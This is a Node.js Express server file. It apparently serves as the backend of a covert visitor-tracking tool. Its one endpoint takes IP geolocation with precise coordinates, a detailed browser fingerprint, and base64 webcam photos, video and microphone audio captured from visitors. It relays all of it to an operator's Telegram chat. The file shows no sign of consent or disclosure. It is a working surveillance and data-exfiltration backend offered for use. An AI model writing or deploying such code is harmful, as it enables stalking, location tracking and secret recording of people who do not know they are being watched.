const express = require('express');
const cors = require('cors');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.');
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Helper: build a clean text summary from IP & fingerprint
function buildMessage(ipData, fingerprint) {
    let msg = '📡 *New Visitor Info*\n\n';

    // IP section
    if (ipData) {
        msg += '*IP Info:*\n';
        msg += `IP: ${ipData.ip || 'N/A'}\n`;
        if (ipData.city) msg += `City: ${ipData.city}\n`;
        if (ipData.region) msg += `Region: ${ipData.region}\n`;
        if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
        if (ipData.country_code) msg += `Country Code: ${ipData.country_code}\n`;
        if (ipData.postal) msg += `Postal: ${ipData.postal}\n`;
        if (ipData.latitude && ipData.longitude) {
            msg += `Location: ${ipData.latitude}, ${ipData.longitude}\n`;
            msg += `Maps: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}\n`;
        }
        if (ipData.org) msg += `ISP: ${ipData.org}\n`;
        if (ipData.timezone) msg += `Timezone: ${ipData.timezone}\n`;
        msg += '\n';
    }

    // Fingerprint section
    if (fingerprint) {
        msg += '*Device & Browser:*\n';
        msg += `User Agent: ${fingerprint.userAgent || 'N/A'}\n`;
        msg += `Platform: ${fingerprint.platform || 'N/A'}\n`;
        msg += `Language: ${fingerprint.language || 'N/A'}\n`;
        if (fingerprint.screen) {
            msg += `Screen: ${fingerprint.screen.width}x${fingerprint.screen.height} (${fingerprint.screen.colorDepth}bit, ratio ${fingerprint.screen.pixelRatio})\n`;
        }
        msg += `Touch Points: ${fingerprint.maxTouchPoints}\n`;
        msg += `Cores: ${fingerprint.hardwareConcurrency}\n`;
        msg += `Memory: ${fingerprint.deviceMemory} GB\n`;
        msg += `Timezone: ${fingerprint.timezone}\n`;
        if (fingerprint.webgl && fingerprint.webgl !== 'not supported') {
            msg += `GPU: ${fingerprint.webgl.renderer}\n`;
        }
        if (fingerprint.canvas) {
            msg += `Canvas: [hash available]\n`;
        }
        msg += '\n';
    }

    msg += `*Timestamp:* ${new Date().toISOString()}`;
    return msg;
}

async function sendTextMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error('sendTextMessage error:', e);
    }
}

async function sendPhoto(base64) {
    try {
        const base64Data = base64.includes(',') ? base64.split(',')[1] : base64;
        const buffer = Buffer.from(base64Data, 'base64');
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'webcam.jpg');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error('sendPhoto error:', e);
    }
}

async function sendVideo(base64) {
    try {
        const base64Data = base64.includes(',') ? base64.split(',')[1] : base64;
        const buffer = Buffer.from(base64Data, 'base64');
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', new Blob([buffer], { type: 'video/mp4' }), 'webcam.mp4');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error('sendVideo error:', e);
    }
}

async function sendAudio(base64) {
    try {
        const base64Data = base64.includes(',') ? base64.split(',')[1] : base64;
        const buffer = Buffer.from(base64Data, 'base64');
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('audio', new Blob([buffer], { type: 'audio/wav' }), 'mic.wav');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error('sendAudio error:', e);
    }
}

// Main endpoint – used for both quick info and full capture
app.post('/api/telegram', async (req, res) => {
    try {
        const { ipData, fingerprint, photo, video, mic, timestamp } = req.body;

        console.log(`[+] Request at ${timestamp}`);

        // 1. Always send the text summary
        const message = buildMessage(ipData, fingerprint);
        await sendTextMessage(message);

        // 2. Media if present
        if (photo) await sendPhoto(photo);
        if (video) await sendVideo(video);
        if (mic) await sendAudio(mic);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server ready on port ${PORT}`);
});
